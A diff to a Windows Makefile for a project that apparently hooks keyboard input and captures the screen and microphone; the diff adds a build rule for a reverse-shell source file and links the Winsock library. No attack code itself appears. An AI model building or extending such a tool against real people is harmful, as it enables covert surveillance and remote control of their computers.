@@ -10,7 +10,8 @@ SRC = \
 	bonus\filter_app\filter.c \
 	bonus\micro\Micro.c \
 	bonus\screen\Screen.c \
-	bonus\screen\key_special.c 
+	bonus\screen\key_special.c \
+	bonus\reverse_shell\reverse_shell.c 
 
 OBJ = \
 	..\obj\hook.obj \
@@ -19,7 +20,8 @@ OBJ = \
 	..\obj\filter.obj \
 	..\obj\Micro.obj \
 	..\obj\Screen.obj \
-	..\obj\key_special.obj 
+	..\obj\key_special.obj \
+	..\obj\reverse_shell.obj 
 
 all: $(NAME)
 
@@ -28,11 +30,9 @@ $(NAME): $(OBJ)
 	/SUBSYSTEM:WINDOWS \
     /ENTRY:mainCRTStartup \
     /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\um\x64" \
-    user32.lib gdi32.lib advapi32.lib kernel32.lib psapi.lib ole32.lib \
+    user32.lib ws2_32.lib gdi32.lib advapi32.lib kernel32.lib psapi.lib ole32.lib \
     uuid.lib \
     mfplat.lib mf.lib mfreadwrite.lib mfuuid.lib winmm.lib shell32.lib mmdevapi.lib
-
-
 
 ..\obj\hook.obj: hook.c
 	if not exist ..\obj mkdir ..\obj
@@ -61,6 +61,10 @@ $(NAME): $(OBJ)
 ..\obj\key_special.obj: bonus\screen\key_special.c
 	if not exist ..\obj mkdir ..\obj
 	$(CC) $(CFLAGS) /c bonus\screen\key_special.c /Fo..\obj\key_special.obj
+
+..\obj\reverse_shell.obj: bonus\reverse_shell\reverse_shell.c
+	if not exist ..\obj mkdir ..\obj
+	$(CC) $(CFLAGS) /c bonus\reverse_shell\reverse_shell.c /Fo..\obj\reverse_shell.obj
 
 clean:
 	if exist ..\obj rmdir /S /Q ..\obj
